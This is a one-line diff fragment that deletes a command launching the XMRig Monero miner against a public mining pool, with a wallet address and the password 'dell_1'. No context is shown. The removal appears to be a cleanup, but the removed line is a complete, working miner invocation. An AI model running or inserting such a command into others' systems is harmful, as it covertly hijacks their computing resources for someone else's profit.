@@ -1,1 +1,0 @@
-xmrig.exe -o pool.supportxmr.com:443 -u 47i1E6mY3AWUBb7jbLMP7XP2brFJ9wcpBdwMLbdLVLVJ8KHFMdys2KwGxVydjyfHogPQQaZyTTCWt7PenQy27BJhNL2uDBm -k --tls -p dell_1
